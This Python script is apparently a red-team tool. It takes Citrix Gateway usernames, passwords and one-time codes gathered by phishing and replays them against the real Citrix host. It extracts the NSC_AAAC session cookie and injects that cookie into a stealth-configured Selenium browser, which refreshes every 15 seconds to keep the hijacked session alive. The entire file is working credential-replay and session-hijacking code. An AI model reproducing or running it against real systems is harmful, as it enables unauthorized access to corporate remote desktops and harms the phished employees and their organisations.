#!/usr/bin/python3

'''
Author: POST Cyberforce - COS (Offensive Security Team)

Usage:
python3 citrix_selenium.py https://citrix.domain.com/ UserName Rand0mPwd123 123456

Description:
This script is used to replay Citrix credentials + OTP gathered during phishing attack on the real Citrix targeted host.
- Request lib automatically grab the authenticated cookie and passed it to Selenium
- Selenium automatically load the cookie into the browser and connect to the Citrix using a new Thread in order to be able to open several detached session at a time
- Selenium automatically refresh the cookie by refreshing the page every 15 sec.

Note:
- Use you own way to pass the phished credentials to this script
- You can disable the Selenium function if you want to use the session cookie by yourself
- Use the chromedriver version according to your Chrome version
'''

from termcolor import colored
import sys, time
import requests
import urllib3
from threading import Thread
from selenium_stealth import stealth
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as ec
from selenium.common.exceptions import NoSuchElementException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
        }

ch_options = Options()
ch_options.add_argument("start-maximized")
ch_options.add_experimental_option("excludeSwitches", ["enable-automation"])
ch_options.add_experimental_option('useAutomationExtension', False)
ch_options.add_experimental_option("detach", True)
ch_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36')
ch_options.add_argument("--log-level=3")
ch_options.add_argument("incognito")

def get_state_context(host):
    uri = 'nf/auth/getAuthenticationRequirements.do'
    url = '%s%s' % (host, uri)

    r = requests.post(url, headers=HEADERS, verify=False)
    st_ctx = None
    try:
        st_ctx = r.text.split('StateContext')[1].replace(' >', '').replace('</', '')
    except:
        pass
    return st_ctx


def authentication(host, user, pwd, token, st_ctx):
    uri = 'nf/auth/doAuthentication.do'
    url = '%s%s' % (host, uri)

    data = {
            'login': user,
            'passwd': pwd,
            'passwd1': token,
            'savecredentials': 'true',
            'Logon': 'Submit',
            'StateContext': st_ctx
            }

    r = requests.post(url, data=data, headers=HEADERS, verify=False)
 
    nsc_cookie = None
    try:
        nsc_cookie = r.cookies.get_dict().get('NSC_AAAC')
    except:
        pass

    return nsc_cookie


def set_client(host, st_ctx, nsc_cookie):
    uri = 'p/u/setClient.do'
    url = '%s%s' % (host, uri)

    data = {
            'nsg-setclient': 'wica',
            'StateContext': st_ctx
            }

    cookies = {
            'NSC_AAAC': nsc_cookie
            }

    r = requests.post(url, data=data, headers=HEADERS, cookies=cookies, verify=False)

    ruri = None
    try:
        ruri = r.text.split('RedirectURL')[1].replace('>', '').replace('</', '')
    except:
        return None

    if ruri.startswith('/'):
        ruri = ruri[1:]

    ruri = '%s%s' % (host, ruri)
    return ruri


def autologin(host, usr, pwd, otp):

    st_ctx = get_state_context(host)
    if not st_ctx:
        print(colored("[!] StateContext not found.", 'red'))
        return None

    print(colored("[*] StateContext retrieved: ", 'yellow', attrs=['bold']), end='')
    print("[%s]" % (st_ctx))

    nsc_cookie = authentication(host, usr, pwd, otp, st_ctx)

    if not nsc_cookie:
        print(colored("[!] NSC Cookie not found, bad credentials / OTP ??", 'red'))
        return None

    print(colored("[*] NSC_AAAC Cookie retrieved: ", 'yellow', attrs=['bold']), end='')
    print("[%s]" % (nsc_cookie))

    print(colored("[*] Looking for redirect URI", 'yellow', attrs=['bold']))

    ruri = set_client(host, st_ctx, nsc_cookie)

    print(colored("[*] Successfully validated session, use those infos: ", 'yellow', attrs=['bold']))
    print(colored("[*] URL: ", 'green', attrs=['bold']), end='')
    print(colored(ruri, 'red'))
    print(colored("[*] NSC_AAAC cookie value: ", 'green', attrs=['bold']), end='')
    print(colored(nsc_cookie, 'red'))
    print(colored("[!] WARNING, Take care of cookies attributes (Path, Domain...)", 'white', 'on_red', ['bold']))

    return (ruri, nsc_cookie)


def selenium_login(cookie):
    driver = webdriver.Chrome(executable_path="./chromedriver", options = ch_options)

    stealth(driver,
       languages=["fr-FR", "fr", "en-US", "en"],
       vendor="Google Inc.",
       platform="Win32",
       webgl_vendor="Intel Inc.",
       renderer="Intel Iris OpenGL Engine",
       fix_hairline=True,
    )

    driver.delete_all_cookies()
    driver.get(host)
    time.sleep(1)
    driver.add_cookie({"name" : "NSC_AAAC", "value" : cookie})
    time.sleep(1)
    driver.get(host+"Citrix/InternalWeb/")
    try: # select "use professional account" if present
        acc = WebDriverWait(driver, 2).until(ec.visibility_of_element_located((By.ID, "protocolhandler-welcome-installButton")))
        acc.click()
    except:
        pass

    while True:
        time.sleep(15)
        driver.refresh()


if __name__ == '__main__':

    if len(sys.argv) != 5:
        print("Usage: %s <host> <username> <password> <otp>" % (sys.argv[0]))
        print("Example: %s https://citrix.domain.com/ UserName Rand0mPwd123* 123456)" % (sys.argv[0]))
        quit()

    host = sys.argv[1]
    usr = sys.argv[2]
    pwd = sys.argv[3]
    otp = sys.argv[4]
    threads = []

    if not host.endswith('/'):
        host += '/'

    nsc_cookie = autologin(host, usr, pwd, otp)[1]
    if nsc_cookie:
        t = Thread(target=selenium_login(nsc_cookie))
        t.start()
        threads.append(t)
